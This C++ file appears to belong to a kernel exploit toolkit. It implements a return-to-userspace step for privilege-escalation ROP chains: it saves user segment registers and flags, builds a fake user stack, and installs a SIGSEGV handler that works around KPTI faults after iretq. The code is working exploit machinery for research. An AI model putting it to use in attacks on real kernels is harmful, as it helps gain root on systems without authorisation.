// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <sys/mman.h>
#include <cstring>
#include <xdk/payloads/RopChain.h>
#include <xdk/rip/RopUtils.h>
#include <iostream>
#include <sys/ucontext.h>
#include <asm-generic/signal-defs.h>
#include <signal.h>

static void (*g_after_lpe_func_addr)() = nullptr;

/**
 * @brief Custom SIGSEGV handler to recover from a faulty kernel return to userspace.
 *
 * This handler catches segmentation faults. Its primary purpose is to handle a
 * specific fault that can occur when the kernel's `iretq` instruction returns
 * to userland. If the instruction pointer (RIP) at the time of the crash
 * exactly matches the address of our intended userspace function, this handler
 * "recovers" by calling that function directly, effectively completing the
 * return. For any other unexpected segfault, it prints verbose debug info.
 *
 * @param signum The signal number received.
 * @param info A pointer to a siginfo_t struct containing details about the signal.
 * @param ucontext A pointer to a ucontext_t struct holding the machine context.
 */
void segfault_handler(int signum, siginfo_t *info, void *ucontext) {
    ucontext_t *uc = static_cast<ucontext_t *>(ucontext);

    // Extract RIP from the context
    void *rip = reinterpret_cast<void *>(uc->uc_mcontext.gregs[REG_RIP]);

    if (rip == g_after_lpe_func_addr) {
        std::cout << "[+] Ret2Usr Signal Handler called" << std::endl;
        g_after_lpe_func_addr();
    } else {
        // If the crash happened elsewhere, print debug info.
        std::cout << "[-] Segfault detected" << std::endl;
        fprintf(stderr, "  Signal: %d (%s)\n", signum, strsignal(signum));
        fprintf(stderr, "  Faulting Address (si_addr): %p\n", info->si_addr);
        fprintf(stderr, "  Instruction Pointer (RIP):  %p\n", rip);
    }

    _exit(1);
}


/**
 * @brief Registers the custom SIGSEGV handler before ret2usr.
 *
 * `iretq` does not guarantee a clean return depending on KPTI. CR3 is not
 * set correctly resulting in a SIGSEGV upon return to userspace.
 * This function sets up a signal handler to complete the LPE. It
 * registers the `segfault_handler` and provides it with the target
 * userspace function's address. This ensures that if the subsequent
 * return to userland faults, the custom handler catches it and completes
 * the transition.
 *
 * @param after_lpe_func The address of the userspace function to jump to.
 */
void setup_signal_handler(void* after_lpe_func) {

  g_after_lpe_func_addr = reinterpret_cast<void (*)()>(after_lpe_func);
  struct sigaction sa;
  sa.sa_flags = SA_SIGINFO;
  sa.sa_sigaction = segfault_handler;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGSEGV, &sa, NULL) == -1) {
      perror("sigaction in Ret2Usr");
      exit(1);
  }

}

/**
 * @brief Prepares a ROP chain payload for returning from kernel to userspace.
 *
 * This function constructs the payload needed to pivot from kernel execution
 * back to a specified function in userspace (`after_lpe_func`). It captures
 * the current CPU state (cs, ss, rflags), allocates a new userspace stack,
 * and adds the complete `RET2USR` action to the provided ROP chain. It also
 * sets up a signal handler as a safeguard for a clean transition.
 *
 * @param rop The RopChain object to which the payload will be added.
 * @param after_lpe_func The userspace function to execute after the return.
 * @param stack_size The size of the new userspace stack to be allocated.
 * @param redzone_size The size of the stack's redzone area.
 */
void RopUtils::Ret2Usr(RopChain& rop, void* after_lpe_func, size_t stack_size,
                       size_t redzone_size) {

  setup_signal_handler(after_lpe_func);

  uint64_t _user_cs = 0;
  uint64_t _user_rflags = 0;
  uint64_t _user_sp = 0;
  uint64_t _user_ss = 0;

  __asm__(
      ".intel_syntax noprefix;"
      "mov %0, cs;"
      "mov %1, ss;"
      "mov %2, rsp;"
      "pushf;"
      "pop %3;"
      ".att_syntax"
      : "=r"(_user_cs), "=r"(_user_ss), "=r"(_user_sp), "=r"(_user_rflags));

  auto fake_stack = (uint64_t)mmap(NULL, stack_size, PROT_READ | PROT_WRITE,
                                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  auto stack_start = fake_stack + stack_size - redzone_size;
  for (size_t i = 0; i < redzone_size - 7; i += 8)
    *(uint64_t*)(stack_start + i) = 0xffffff4545454545;  // use canonical address
  rop.AddRopAction(RopActionId::RET2USR,
                   {(uint64_t)after_lpe_func, _user_cs, _user_rflags,
                    stack_start, _user_ss});
}
